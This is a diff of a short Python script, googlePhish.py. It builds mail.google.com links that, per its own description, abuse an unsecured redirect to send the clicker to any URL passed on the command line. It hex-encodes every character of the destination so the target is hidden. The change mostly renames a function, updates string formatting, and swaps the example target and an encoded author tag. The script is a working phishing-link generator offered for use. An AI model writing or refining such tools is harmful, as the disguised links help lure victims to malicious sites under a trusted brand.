@@ -13,18 +13,18 @@ print ("""
                                                                                                    """)
 
 
-def urlEncodeUrl(url):
+def url_encode_all_chars(url):
     encoded = url.encode('utf-8').hex()
     return '%' + '%'.join(a+b for a,b in zip(encoded[::2], encoded[1::2]))
 
 def printUrl(src):
-    print("https://mail.google.com/webhp#?uid=Z29vZ2xlUGhpc2g6ICBnaXRodWIuY29tL3ZscDQ0Mw==&q={}=&btnI=I".format(urlEncodeUrl(src)))
+    print("https://mail.google.com/webhp#?uid=Z2l0aHViLmNvbS92bHA0NDM=&q=%s=&btnI=I" % url_encode_all_chars(src))
 
 
 
 parser = argparse.ArgumentParser(description='Generate links to google searchable urls using unsecured redirects in mail.google.com.'
                                              'Usage python3 ./googlePhish.py --url <url>')
-parser.add_argument('--url', metavar='Location to link to e.g. https://pixabay.com/images/search/kitten', type=printUrl, nargs=1)
+parser.add_argument('--url', metavar='Location to link to e.g. https://cutecatsinhats.com', type=printUrl, nargs=1)
 
 try:
     if (len(sys.argv) < 2):
